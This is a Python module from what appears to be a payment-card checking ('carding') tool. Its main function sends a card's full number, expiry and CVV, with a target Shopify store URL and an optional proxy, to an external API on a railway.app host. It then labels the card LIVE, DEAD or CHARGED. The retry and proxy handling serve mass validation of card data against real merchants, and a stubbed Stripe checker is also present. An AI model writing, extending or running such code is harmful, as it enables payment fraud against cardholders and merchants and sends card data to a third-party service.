import asyncio
import logging
import re
from dataclasses import dataclass
from typing import Optional
from core.card_parser import Card
import aiohttp

logger = logging.getLogger(__name__)

@dataclass
class CheckResult:
    status: str
    message: str
    gateway: str
    price: float
    store: str
    card: Card
    debug_info: str = ""

def extract_price(price_str):
    try:
        m = re.search(r'\$?([0-9.]+)', str(price_str))
        if m:
            return float(m.group(1))
    except:
        pass
    return 0.0

async def shopify_check(
    card: Card,
    store_url: str,
    proxy: Optional[str] = None,
    timeout: int = 120,
    max_retries: int = 2,
) -> CheckResult:
    api_url = "https://cozy-abundance-production-88ca.up.railway.app/shopify"
    
    params = {
        "site": store_url,
        "cc": f"{card.number}|{card.month}|{card.year}|{card.cvv}"
    }
    if proxy:
        params["proxy"] = proxy

    async with aiohttp.ClientSession() as session:
        for attempt in range(max_retries + 1):
            try:
                api_timeout = aiohttp.ClientTimeout(total=timeout)
                async with session.get(api_url, params=params, timeout=api_timeout) as r:
                    if r.status == 200:
                        try:
                            data = await r.json()
                        except Exception:
                            text = await r.text()
                            logger.debug("External API returned non-JSON: %s", text)
                            if attempt < max_retries:
                                await asyncio.sleep(2)
                                continue
                            return CheckResult("DEAD", "api_error", "Shopify Payments", 0.0, store_url, card)
                            
                        if not isinstance(data, dict):
                            data = {}
                            
                        status = str(data.get("Status") or "DEAD").upper()
                        msg = str(data.get("Response") or data.get("RawResponse") or "unknown_error")
                        gw = str(data.get("Gateway") or "Shopify Payments")
                        price = extract_price(data.get("Price", "0.0"))
                        
                        if "DEAD" in status: status = "DEAD"
                        elif "LIVE" in status: status = "LIVE"
                        elif "CHARGED" in status: status = "CHARGED"
                        elif "SITE_ERROR" in status:
                            status = "DEAD"
                            msg = f"site_error: {msg}"
                            
                        return CheckResult(status, msg, gw, price, store_url, card)
                    elif r.status in (502, 503, 504, 429):
                        logger.debug("External API %s (attempt %d/%d)", r.status, attempt + 1, max_retries + 1)
                        if attempt < max_retries:
                            await asyncio.sleep(2)
                            continue
                        return CheckResult("DEAD", f"api_http_error_{r.status}", "Shopify Payments", 0.0, store_url, card)
                    else:
                        text = await r.text()
                        logger.debug("External API error %s: %s", r.status, text)
                        return CheckResult("DEAD", f"api_http_error_{r.status}", "Shopify Payments", 0.0, store_url, card)
            except asyncio.TimeoutError:
                logger.debug("External API timeout")
                return CheckResult("DEAD", "timeout", "Shopify Payments", 0.0, store_url, card)
            except Exception as e:
                logger.debug("External API exception: %s", e)
                
            if attempt < max_retries:
                await asyncio.sleep(1)
                
    return CheckResult("DEAD", "timeout", "Shopify Payments", 0.0, store_url, card)

# Dummy stripe_check so imports don't break
async def stripe_check(card: Card, proxy: Optional[str] = None, timeout: int = 15, secret_key: str = "") -> CheckResult:
    return CheckResult("DEAD", "stripe_disabled", "Stripe", 0.0, "stripe", card)
